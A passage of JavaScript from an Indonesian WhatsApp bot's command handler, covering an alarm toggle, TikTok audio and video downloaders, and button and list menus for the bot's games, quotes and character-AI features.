    isAlarmActive = false
    reply(`Alarm berhasil dimatikan`)
  } else {
    reply(`Pilihan yang tersedia: atur, matikan`)
  }

  if (isAlarmActive && new Date().toLocaleTimeString() === clockstring) {
    playAlarm()
  }
}
break
case 'kanjut': {
RyuuBotz.sendMessage(m.chat, {
 image: { url: pp },
 caption: wm,
"annotations": [
      {
        "polygonVertices": [
          {
            "x": 0.05625700578093529,
            "y": 0.1530572921037674
          },
          {
            "x": 0.9437337517738342,
            "y": 0.1530572921037674
          },
          {
            "x": 0.9437337517738342,
            "y": 0.8459166884422302
          },
          {
            "x": 0.05625700578093529,
            "y": 0.8459166884422302
          }
        ],
        "newsletter": {
          "newsletterJid": "120363419382206255@newsletter",
          "serverMessageId": 3033,
          "newsletterName": "ReinzID & Qiaa",
          "contentType": "UPDATE_CARD",
        }
      }
    ]
}, { quoted : m })
}
break;
case 'ttaudio':
case 'tiktokaudio':{
if (!text) return reply(`⚠️ Hmm... Kamu belum kasih link nih! 🫣 Coba ketik kayak gini ya: *${prefix + command} <url>*`);
				try {
					let anu = await tiktokDownloaderVideo(text);
					let audio = anu.music_info.url;
					await RyuuBotz.sendMessage(
						m.chat,
						{
							text: `🎵 *TikTok Audio*\n\n` +
							`🎼 *Judul*: ${anu.music_info.title || '-'}\n` +
							`🎤 *Author*: ${anu.music_info.author || '-'}\n` +
							`💿 *Album*: ${anu.music_info.album || '-'}\n\n` +
							`🔗 *Source*: ${text}`
						},
						{ quoted: m }
					);
					await RyuuBotz.sendMessage(
						m.chat,
						{
							audio: { url: audio },
							mimetype: 'audio/mpeg',
							fileName: `${anu.music_info.title || 'audio'}.mp3`
						},
						{ quoted: m }
					);
				} catch (error) {
					console.error(error);
					await reply(`❌ Terjadi kesalahan saat mengambil audio. Coba lagi nanti, ya Kak!`);
				}
			}
break
//=============[ OWNER - COMMAND ]================
        //============
        case 'tiktokslide':
			case 'ttslide':
			case 'tiktokfoto':
			case 'tiktokmp4':
			case 'ttnowm':
			case 'tiktoknowm':{
				if (!text) return replyReinzID(`⚠️ Hmm... Kamu belum kasih link nih! 🫣 Coba ketik kayak gini ya: *${prefix + command} <url>*`);
				try {
					RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
					let anu = await tiktokDownloaderVideo(text);
					let item = 0;
					for (let imgs of anu.data) {
						if (imgs.type == "nowatermark") {
							await RyuuBotz.sendMessage(
								m.chat,
								{
									video: { url: imgs.url }, caption: 
`\`[  ᴠɪᴅᴇᴏ ɪɴғᴏ : ]\`
> ʀᴇɢɪᴏɴ : ${anu.region}
> ᴛᴀᴋᴇɴ : ${anu.taken_at}\n\n
\`[ sᴛᴀᴛɪsᴛɪᴋ ɪɴғᴏ : ]\`
> ᴠɪᴇᴡᴇʀs : ${anu.stats.views}
> ʟɪᴋᴇs : ${anu.stats.likes}
> ᴄᴏᴍᴍᴇɴᴛ : ${anu.stats.comment}
> sʜᴀʀᴇ : ${anu.stats.share}
> ᴅᴏᴡɴʟᴏᴀᴅ : ${anu.stats.download}\n\n
\`[  ᴀᴜᴛʜᴏʀ ɪɴғᴏ : ]\`
> ғᴜʟʟɴᴀᴍᴇ : ${anu.author.fullname}
> ɴɪᴄᴋɴᴀᴍᴇ : ${anu.author.nickname}\n\n
> ᴄᴀᴘᴛɪᴏɴ : ${anu.title || 'No Caption'}`
								},
								{ quoted: m }
							);
						}
						if (imgs.type == "photo") {
							if (item == 0) {
								await RyuuBotz.sendMessage(
									m.chat,
									{
										image: { url: imgs.url },
										caption: 
`\`[  ᴘʜᴏᴛᴏ ɪɴғᴏ : ]\`
> ʀᴇɢɪᴏɴ : ${anu.region}
> ᴛᴀᴋᴇɴ : ${anu.taken_at}\n\n
\`[ sᴛᴀᴛɪsᴛɪᴋ ɪɴғᴏ : ]\`
> Views: ${anu.stats.views}
> Likes: ${anu.stats.likes}
> ᴄᴏᴍᴍᴇɴᴛ : ${anu.stats.comment}
> sʜᴀʀᴇ : ${anu.stats.share}
> ᴅᴏᴡɴʟᴏᴀᴅ : ${anu.stats.download}\n\n
\`[  ᴀᴜᴛʜᴏʀ ɪɴғᴏ : ]\`
> ғᴜʟʟɴᴀᴍᴇ : ${anu.author.fullname}
> ɴɪᴄᴋɴᴀᴍᴇ : ${anu.author.nickname}\n\n
> ᴄᴀᴘᴛɪᴏɴ : ${anu.title || 'No Caption'}${m.isGroup ? anu.data.length > 1 ? 
"\n📥 _sɪsᴀ ғᴏᴛᴏ ᴅɪᴋɪʀɪᴍ ᴋᴇ ᴘʀɪᴠᴀᴛᴇ ᴄʜᴀᴛ_\n" : "\n" : "\n"}`
									},
									{ quoted: m }
								);
							} else {
								await RyuuBotz.sendMessage(
									m.sender,
									{
										image: { url: imgs.url }
									},
									{ quoted: m }
								);
							}
							item += 1;
							await sleep(2000);
						}
					}
				} catch (err) {
					console.log(err);
					replyReinzID('⚠️ Gagal mengambil data dari TikTok. Pastikan URL valid atau coba lagi nanti.');
				}
			}
			
			break;
//=================================================
case 'ryuumenu':
case 'menuv1':
case 'menu-v1': {
    let menu = `Hai Kak ${pushname}👋,

Perkenalkan, aku *${botname}* - MD. yang dibuat oleh ${ownername}. 
Gunakan tombol menu di bawah ini untuk mengetahui semua fitur yang ada, silakan pakai sesuai kebutuhan masing-masing.
${kosong}
╭─⌈ *𝙄𝙉𝙁𝙊 𝙐𝙎𝙀𝙍* ⌋
│◦ ɴᴀᴍᴀ : *${pushname}*
│◦ sᴛᴀᴛᴜs : *${isPrem ? 'ᴘʀᴇᴍɪᴜᴍ ✓' : 'ғʀᴇᴇ 𝕏'}*
│◦ ɴᴏᴍᴏʀ : ${m.sender.split("@")[0]}
╰─────────────

╭─⌈ *𝙊𝙒𝙉𝙀𝙍 𝙄𝙉𝙁𝙊* ⌋
│𖥔 ᴄʀᴇᴀᴛᴏʀ : ${ownername}
│𖥔 ɴᴀᴍᴀ ʙᴏᴛ : ${botname}
│𖥔 ᴠᴇʀsɪ : 0.0.5
│𖥔 ᴛʏᴘᴇ : ᴄᴀsᴇ
│𖥔 ɪɴsᴛᴀɢʀᴀᴍ : ${ig}
│𖥔 ᴡʜᴀᴛsᴀᴘᴘ : ${ownernumber}
╰─────────────

\`ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟᴇʙɪʜ ʟᴀɴᴊᴜᴛ\`\nSilakan click "list menu"`;

    const buttons = [
        { buttonId: `${prefix}owner`, buttonText: { displayText: 'owner' } },
        { buttonId: `${prefix}menu`, buttonText: { displayText: 'menu simpel' } }
    ];

    const flowActions = [
        {
            buttonId: `${prefix}menu`,
            buttonText: { displayText: '📋 LIST MENU' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "LIST MENU",
                    sections: [
                        {
                            title: "乂 ʀ ᴀ ɴ ᴅ ᴏ ᴍ - ᴘ ʜ ᴏ ᴛ ᴏ 乂",
                            rows: [
                                { title: "aesthetic", id: `${prefix}aesthetic` },
                                { title: "coffee", id: `${prefix}coffee` },
                                { title: "wikimedia", id: `${prefix}wikimedia` },
                                { title: "wallpaper", id: `${prefix}wallpaper` },
                                { title: "art", id: `${prefix}art` },
                                { title: "bts", id: `${prefix}bts` },
                                { title: "dogwoof", id: `${prefix}dogwoof` },
                                { title: "catmeow", id: `${prefix}catmeow` },
                                { title: "lizardpic", id: `${prefix}lizardpic` },
                                { title: "goosebird", id: `${prefix}goosebird` },
                                { title: "8ballpool", id: `${prefix}8ballpool` },
                                { title: "cosplay", id: `${prefix}cosplay` },
                                { title: "hacker", id: `${prefix}hacker` },
                                { title: "cyber", id: `${prefix}cyber` },
                                { title: "gamewallpaper", id: `${prefix}gamewallpaper` },
                                { title: "islamic", id: `${prefix}islamic` },
                                { title: "jennie", id: `${prefix}jennie` },
                                { title: "jiso", id: `${prefix}jiso` },
                                { title: "satanic", id: `${prefix}satanic` },
                                { title: "justina", id: `${prefix}justina` },
                                { title: "cartoon", id: `${prefix}cartoon` },
                                { title: "pentol", id: `${prefix}pentol` },
                                { title: "cat", id: `${prefix}cat` },
                                { title: "kpop", id: `${prefix}kpop` },
                                { title: "exo", id: `${prefix}exo` },
                                { title: "lisa", id: `${prefix}lisa` },
                                { title: "space", id: `${prefix}space` },
                                { title: "car", id: `${prefix}car` },
                                { title: "technology", id: `${prefix}technology` },
                                { title: "bike", id: `${prefix}bike` },
                                { title: "shortquote", id: `${prefix}shortquote` },
                                { title: "antiwork", id: `${prefix}antiwork` },
                                { title: "hacking", id: `${prefix}hacking` },
                                { title: "boneka", id: `${prefix}boneka` },
                                { title: "rose", id: `${prefix}rose` },
                                { title: "ryujin", id: `${prefix}ryujin` },
                                { title: "ulzzangboy", id: `${prefix}ulzzangboy` },
                                { title: "ulzzanggirl", id: `${prefix}ulzzanggirl` },
                                { title: "wallml", id: `${prefix}wallml` },
                                { title: "wallphone", id: `${prefix}wallphone` },
                                { title: "mountain", id: `${prefix}mountain` },
                                { title: "goose", id: `${prefix}goose` },
                                { title: "profilepic", id: `${prefix}profilepic` },
                                { title: "couplepic", id: `${prefix}couplepic` },
                                { title: "programming", id: `${prefix}programming` },
                                { title: "pubg", id: `${prefix}pubg` },
                                { title: "blackpink", id: `${prefix}blackpink` },
                                { title: "randomboy", id: `${prefix}randomboy` },
                                { title: "randomgirl", id: `${prefix}randomgirl` },
                                { title: "hijab", id: `${prefix}hijab` },
                                { title: "chinese", id: `${prefix}chinese` },
                                { title: "indo", id: `${prefix}indo` },
                                { title: "japanese", id: `${prefix}japanese` },
                                { title: "korean", id: `${prefix}korean` },
                                { title: "malay", id: `${prefix}malay` },
                                { title: "thai", id: `${prefix}thai` },
                                { title: "vietnamese", id: `${prefix}vietnamese` }
                            ]
                        },
                        {
                            title: "乂 ᴏ̨ᴜᴏᴛᴇs-ᴍᴇɴᴜ 乂",
                            rows: [
                                { title: "quotesanime", id: `${prefix}quotesanime` },
                                { title: "quotesbacot", id: `${prefix}quotesbacot` },
                                { title: "quotesbucin", id: `${prefix}quotesbucin` },
                                { title: "quotesmotivasi", id: `${prefix}quotesmotivasi` },
                                { title: "quotesgalau", id: `${prefix}quotesgalau` },
                                { title: "quotesgombal", id: `${prefix}quotesgombal` },
                                { title: "quoteshacker", id: `${prefix}quoteshacker` },
                                { title: "quotesbijak", id: `${prefix}quotesbijak` }
                            ]
                        },
                        {
                            title: "乂 ɢ ᴀ ᴍ ᴇ - ᴍᴇɴᴜ 乂",
                            rows: [
                                { title: "tebakkata", id: `${prefix}tebakkata` },
                                { title: "tebaktebakan", id: `${prefix}tebaktebakan` },
                                { title: "tebaklirik", id: `${prefix}tebaklirik` },
                                { title: "tebakgambar", id: `${prefix}tebakgambar` },
                                { title: "tebaklagu", id: `${prefix}tebaklagu` },
                                { title: "tebakkimia", id: `${prefix}tebakkimia` },
                                { title: "asahotak", id: `${prefix}asahotak` },
                                { title: "siapaaku", id: `${prefix}siapaaku` },
                                { title: "susunkata", id: `${prefix}susunkata` },
                                { title: "tekateki", id: `${prefix}tekateki` },
                                { title: "tebakbendera", id: `${prefix}tebakbendera` },
                                { title: "tebakbenderav2", id: `${prefix}tebakbenderav2` },
                                { title: "tebakkabupaten", id: `${prefix}tebakkabupaten` },
                                { title: "caklontong", id: `${prefix}caklontong` },
                                { title: "family100", id: `${prefix}family100` },
                                { title: "werewolf", id: `${prefix}werewolf` }
                            ]
                        },
                        {
                            title: "乂 ᴄʜᴀʀᴀᴄᴛᴇʀ ᴀɪ - ᴍᴇɴᴜ 乂",
                            rows: [
                                { title: "fremy-ai", id: `${prefix}fremy-ai` },
                                { title: "rio-ai", id: `${prefix}rio-ai` },
                                { title: "fenris-ai", id: `${prefix}fenris-ai` },
                                { title: "yuuka-ai", id: `${prefix}yuuka-ai` },
                                { title: "eresh-ai", id: `${prefix}eresh-ai` },
                                { title: "hanako-ai", id: `${prefix}hanako-ai` },
                                { title: "ayaka-ai", id: `${prefix}ayaka-ai` },
                                { title: "hutao-ai", id: `${prefix}hutao-ai` },
                                { title: "kurumi-ai", id: `${prefix}kurumi-ai` },
                                { title: "shiroko-ai", id: `${prefix}shiroko-ai` },
                                { title: "alya-ai", id: `${prefix}alya-ai` },
                                { title: "mahiru-ai", id: `${prefix}mahiru-ai` },
                                { title: "elaina-ai", id: `${prefix}elaina-ai` },
                                { title: "itsuki-ai", id: `${prefix}itsuki-ai` },
                                { title: "hoshino-ai", id: `${prefix}hoshino-ai` },
                                { title: "miku-ai", id: `${prefix}miku-ai` },
                                { title: "yuno-ai", id: `${prefix}yuno-ai` }
                            ]
                        }
                    ]
                })
            }
        }
    ];

    const buttonMessage = {
        document: fs.readFileSync("./node_modules/Arisu-MD/settings.js"),
        fileName: ucapanWaktu,
        fileLength: 99999999999999,
        pageCount: 99999999999999,
        mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        caption: menu,
        footer: `\n© ${global.ownername} - 2025`,
        buttons: [...buttons, ...flowActions],
        headerType: 6,
        contextInfo: {
            externalAdReply: {
                containsAutoReply: true,
                mediaType: 1,
                renderLargerThumbnail: true,
                thumbnailUrl: `${global.thumbnail}`,
                title: `© ${global.ownername} - 2025`,
                body: "Asistent Virtual"
            }
        },
        viewOnce: true
    };

    return RyuuBotz.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;
case 'reinzzmenu':
case 'menu1': {
let teksnya = `
Haii @${m.sender.split("@")[0]},
Perkenalkan, aku *${botname}* - MD. yang di buat oleh ${ownername} tombol menu di bawah ini untuk mengetahui semua fitur yang ada, silahkan pakai sesuai kebutuhan masing masing.
`
await RyuuBotz.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.allmenubutton`,
      buttonText: { displayText: 'Menu' },
      type: 1
    },
    {
      buttonId: `.menu`,
      buttonText: { displayText: 'Menu Simpel' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./node_modules/Arisu-MD/package.json"),
  fileName: `${botname} By ReinzID Offc`,
  mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  fileLength: 9999999999999999999999999999999999999999999999999999999999,
  caption: teksnya,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender],
    externalAdReply: {
      title: `Mahiru - MD`,
      body: `© Mahiru - MD 2024 - 2025`,
      thumbnailUrl: `${global.reinzzmenu}`,
      sourceUrl: 'https://whatsapp.com/channel/0029VazsM78H5JM1Rbn18I0s',
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break
case 'allmenubutton':
        {
          RyuuBotz.sendMessage(m.chat, {
            react: {
              text: `⏱️`,
              key: m.key
            }
          });
          let ReinzID_sad = `${allmenu(prefix, hituet)}`;
          RyuuBotz.sendMessage(m.chat, {
            video: fs.readFileSync("./node_modules/Arisu-MD/data/image/thumbvid.mp4"),
            gifPlayback: true,
            caption: ReinzID_sad,
            contextInfo: {
              forwardingScore: 1,
              isForwarded: true,
              externalAdReply: {
                title: botname,
                body: ownername,
                thumbnailUrl: `${global.thumbnail}`,
                sourceUrl: `https://whatsapp.com/channel/0029Vb5xetZBadmS2IPdmG1X`,
                mediaType: 1,
                renderLargerThumbnail: true,
                externalAdReply: {
                  mentionedJid: [m.sender]
                }
              }
            }
          }, {
            quoted: m
          });
          let muskk = {
            audio: fs.readFileSync("./node_modules/Arisu-MD/image/audio/allmenu.mp3"),
            mimetype: "audio/mp4",
            ptt: true
          };
          await RyuuBotz.sendMessage(m.chat, muskk, {
            quoted: m
          });
        }
        break;
case 'storemenubutton': {
let teks =`┏『 *\`乂 s ᴛ ᴏ ʀ ᴇ - ᴍ ᴇ ɴ ᴜ 乂\`* 』━◧
║◦ *${prefix}list*
║◦ *${prefix}addlist*
║◦ *${prefix}dellist*
║◦ *${prefix}update*
║◦ *${prefix}jeda*
║◦ *${prefix}tambah*
║◦ *${prefix}kurang*
║◦ *${prefix}kali*
║◦ *${prefix}bagi*
║◦ *${prefix}delsetdone*
║◦ *${prefix}changedone*
║◦ *${prefix}setdone*
║◦ *${prefix}delproses*
║◦ *${prefix}changeproses*
║◦ *${prefix}setproses*
║◦ *${prefix}proses <reply chat>*
║◦ *${prefix}done <reply chat>*
┗━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `.ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.caibutton`, 
          },
        ]},
        {
        title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`, 
        highlight_label: `ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
        rows: [
          {
            title: "ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴀʀᴜ",
            id: `.newupdatebutton`, 
          },
          {
            title: "ғɪᴛᴜʀ ғɪx",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ғɪx",
            id: `.fixbutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `.bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `.donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `.aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `.funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `.rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `.pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `.gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `.storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `.animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `.othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `.ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `.groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `.islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `.beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `.quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `.stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `.sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `.downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `.ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: ".anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: ".ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: ".randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: ".randomphotomenubutton",
           },
        ]},
            {
        title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴏғғᴄ`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `.infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'gamemenubutton': {
let teks =`┏『 *\`乂 ɢ ᴀ ᴍ ᴇ - ᴍᴇɴᴜ 乂\`* 』━◧
║◦ *${prefix}tebakkata*
║◦ *${prefix}tebaktebakan*
║◦ *${prefix}tebaklirik*
║◦ *${prefix}tebakgambar*
║◦ *${prefix}tebaklagu*
║◦ *${prefix}tebakkimia*
║◦ *${prefix}asahotak*
║◦ *${prefix}siapaaku*
║◦ *${prefix}susunkata*
║◦ *${prefix}tekateki*
║◦ *${prefix}tebakbendera*
║◦ *${prefix}tebakbenderav2*
║◦ *${prefix}tebakkabupaten*
║◦ *${prefix}caklontong*
║◦ *${prefix}family100*
║◦ *${prefix}werewolf*
┗━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `.ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.caibutton`, 
          },
        ]},
        {
        title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`, 
        highlight_label: `ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
        rows: [
          {
            title: "ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴀʀᴜ",
            id: `.newupdatebutton`, 
          },
          {
            title: "ғɪᴛᴜʀ ғɪx",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ғɪx",
            id: `.fixbutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `.bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `.donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `.aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `.funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `.rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `.pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `.gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
